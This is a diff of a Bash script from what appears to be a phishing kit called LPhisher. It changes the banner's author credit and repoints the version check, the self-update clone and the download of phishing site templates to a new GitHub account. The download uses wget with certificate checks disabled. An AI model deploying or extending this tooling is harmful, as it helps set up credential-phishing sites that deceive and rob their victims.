@@ -52,7 +52,7 @@ cbanner(){
 	echo -e "${YELLOW} ██║       ${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
 	echo -e "${YELLOW} █████████╗${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
 	echo -e "${YELLOW} ╚════════╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
-	echo -e "${CYAN}                                                  By - ${RED}RDXLR${NC}"
+	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
 	echo -e "${CYAN}        ${NC} "
 	echo -e "${GREEN}                           Version 1.0 ${NC}"
 	echo -e "${CYAN}        ${NC} "
@@ -165,7 +165,7 @@ check_update() {
         rm -rf version.txt
         rm -rf core/update/tmp/version.txt
 
-        wget --no-check-certificate https://raw.githubusercontent.com/RDXLR/LPhisher/main/core/update/version.txt > /dev/null 2>&1
+        wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/LPhisher/main/core/update/version.txt > /dev/null 2>&1
         mv version.txt core/update/tmp
 
         current_ver=$( cat core/update/version.txt )
@@ -201,7 +201,7 @@ update() {
         cd ..
         rm -rf LPhisher
         echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
-        git clone https://github.com/RDXLR/LPhisher
+        git clone https://github.com/Alygnt/LPhisher
 
         if [ -d LPhisher ]; then
                 cd LPhisher
@@ -434,7 +434,7 @@ PORT='4444'
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
 	zipfullname=$zipname".zip"
-	zipurl="https://github.com/RDXLR/phisher-modules/raw/main/csites/"$zipfullname
+	zipurl="https://github.com/Alygnt/phisher-modules/raw/main/csites/"$zipfullname
 	wget --no-check-certificate "$zipurl" > /dev/null 2>&1
 	if [ -e $zipfullname ]; then
 	        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded sucesssfully..."${WHITE}
